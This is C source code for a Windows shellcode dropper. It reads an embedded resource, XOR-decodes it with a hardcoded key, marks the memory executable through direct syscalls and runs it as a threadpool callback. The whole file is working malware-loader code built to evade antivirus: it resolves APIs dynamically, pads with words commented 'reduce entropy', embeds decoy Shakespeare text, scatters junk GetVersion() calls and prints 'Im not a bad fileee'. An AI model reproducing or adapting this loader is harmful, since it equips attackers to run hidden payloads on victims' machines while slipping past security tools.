#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include "resource.h"
#include "syscalls-dropper.h"

#pragma warning(disable: 4996)

typedef VOID(WINAPI* RtlMoveMemoryA)(
	PVOID   Destination,
	PVOID   Source,
	SIZE_T  Length
	);

typedef HRSRC(WINAPI* FindResourceP)(
	HMODULE hModule,
	LPCWSTR  lpName,
	LPCWSTR  lpType
	);
typedef DWORD(WINAPI* SizeofResourceA)(
	HMODULE hModule,
	HRSRC   hResInfo
	);

typedef HGLOBAL(WINAPI* LoadResourceA)(
	HMODULE hModule,
	HRSRC   hResInfo
	);

typedef LPVOID(WINAPI* LockResourceA)(
	HGLOBAL hResData
	);

typedef HANDLE(WINAPI* CreateEventP)(
	LPSECURITY_ATTRIBUTES lpEventAttributes,
	BOOL                  bManualReset,
	BOOL                  bInitialState,
	LPCSTR                lpName
	);


typedef PTP_WAIT(WINAPI* CreateThreadpoolWaitA)(
	PTP_WAIT_CALLBACK       pfnwa,
	PVOID                   pv,
	PTP_CALLBACK_ENVIRON     pcbe
	);

typedef VOID(WINAPI* SetThreadpoolWaitA)(
	PTP_WAIT          pwa,
	HANDLE            h,
	PFILETIME         pftTimeout
	);


typedef VOID(NTAPI* pRtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSTATUS(NTAPI* pLdrLoadDll) (
	PWCHAR PathToFile,
	ULONG Flags,
	PUNICODE_STRING ModuleFileName,
	PHANDLE ModuleHandle
	);




HMODULE MyLoadLibrary(LPCWSTR lpFileName) {
	UNICODE_STRING ustrModule;
	HANDLE hModule = NULL;

	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	pRtlInitUnicodeString RtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");

	RtlInitUnicodeString(&ustrModule, lpFileName);

	pLdrLoadDll myLdrLoadDll = (pLdrLoadDll)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "LdrLoadDll");
	if (!myLdrLoadDll) {
		return NULL;
	}

	NTSTATUS status = myLdrLoadDll(NULL, 0, &ustrModule, &hModule);
	return (HMODULE)hModule;
}

void decodeSC(char* scAddr, DWORD scSize, char* keyAddr, DWORD keySize) {
	if (!scAddr || keyAddr == 0 || !keyAddr || keySize == 0)
		return;
	for (DWORD i = 0; i < scSize; i++) {
		GetVersion();
		scAddr[i] ^= keyAddr[i % keySize];
		GetVersion();
	}
	return;
}



int main()
{
	const char* text = "Let our best heads"
		"Know, that to - morrow the last of many battles"
		"We mean to fight : within our files there are"
		"Of those that served Mark Antony but late"
		"Enough to fetch him in.See it done"
		"And feast the army; we have store to do'"
		"And they have earn'd the waste. Poor Antony!";

	const char* words[10] = { "aaron", "abandoned", "abdomen", "aberdeen", "abilities", "ability", "aboriginal", "about", "above", "abraham" }; // reduce entropy


	HMODULE kernel32 = MyLoadLibrary(L"kernel32.dll");
	HMODULE ntdll = MyLoadLibrary(L"ntdll.dll");
	if (!kernel32) {
		return 5;
	}

	if (!ntdll) {
		return 4;
	}


	const char* wordss[10] = { "aaron", "abandoned", "abdomen", "aberdeen", "abilities", "ability", "aboriginal", "about", "above", "abraham" }; // reduce entropy

	GetVersion();
	RtlMoveMemoryA RtlMoveMemoryF = (RtlMoveMemoryA)GetProcAddress(ntdll, "RtlMoveMemory");
	GetVersion();
	CreateEventP CreateEventF = (CreateEventP)GetProcAddress(kernel32, "CreateEventA");
	GetVersion();
	GetVersion();
	CreateThreadpoolWaitA CreateThreadpoolWaitF = (CreateThreadpoolWaitA)GetProcAddress(kernel32, "CreateThreadpoolWait");
	GetVersion();
	SetThreadpoolWaitA SetThreadpoolWaitF = (SetThreadpoolWaitA)GetProcAddress(kernel32, "SetThreadpoolWait");
	GetVersion();
	SizeofResourceA SizeofResourceF = (SizeofResourceA)GetProcAddress(kernel32, "SizeofResource");
	GetVersion();
	LoadResourceA LoadResourceF = (LoadResourceA)GetProcAddress(kernel32, "LoadResource");
	GetVersion();
	LockResourceA LockResourceF = (LockResourceA)GetProcAddress(kernel32, "LockResource");
	GetVersion();
	FindResourceP FindResourceF = (FindResourceP)GetProcAddress(kernel32, "FindResourceW");

	const char* wordsss[10] = { "aaron", "abandoned", "abdomen", "aberdeen", "abilities", "ability", "aboriginal", "about", "above", "abraham" }; // reduce entropy

	printf("Im not a bad fileee!!!!");

	if (
		RtlMoveMemoryF == NULL ||
		CreateThreadpoolWaitF == NULL ||
		SetThreadpoolWaitF == NULL) {
		return 2;
	}
	const char* wfords[10] = { "aaron", "abandoned", "abdomen", "aberdeen", "abilities", "ability", "aboriginal", "about", "above", "abraham" }; // reduce entropy
	
	HRSRC shellcodeResource = FindResourceF(NULL, MAKEINTRESOURCE(IDR_TEST_BIN1), L"TEST_BIN");
	SIZE_T shellcodeSize = static_cast<SIZE_T>(SizeofResourceF(NULL, shellcodeResource));
	GetVersion();
	HGLOBAL shellcodeResouceData = LoadResourceF(NULL, shellcodeResource);
	GetVersion();
	LPVOID shellcodeAddressRsrc = LockResourceF(shellcodeResouceData);
	if (!shellcodeAddressRsrc)
		return 0;
	GetVersion();
	
	PVOID shellAddress = NULL;
	NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &shellAddress, 0, &shellcodeSize, MEM_COMMIT, PAGE_READWRITE);

	//LPVOID shellAddress = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_READWRITE); // change to execute
	GetVersion();
	RtlMoveMemoryF(shellAddress, shellcodeAddressRsrc, shellcodeSize);
	GetVersion();
	// page execute
	const char* wotrrds[10] = { "aaron", "abandoned", "abdomen", "aberdeen", "abilities", "ability", "aboriginal", "about", "above", "abraham" }; // reduce entropy

	unsigned char userinput[2] = { 0x08, 0x4B };
	GetVersion();


	//calculate PI
	// wait
	//calculate PI
	HANDLE event = CreateEventF(NULL, FALSE, TRUE, NULL);


	decodeSC((char*)shellAddress, shellcodeSize, (char*)userinput, 2);

	
	GetVersion();
	
	GetVersion();
	DWORD oldProtect = 0;
	GetVersion();
	NTSTATUS status2 = NtProtectVirtualMemory(GetCurrentProcess(), &shellAddress, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);


	// WAIT HERE

	GetVersion();


	PTP_WAIT threadPoolWait = CreateThreadpoolWaitF((PTP_WAIT_CALLBACK)shellAddress, NULL, NULL);


	GetVersion();
	SetThreadpoolWaitF(threadPoolWait, event, NULL);


	GetVersion();
	NTSTATUS statusa = NtWaitForSingleObject(event, FALSE, NULL);


	GetVersion();
	return 0;

}
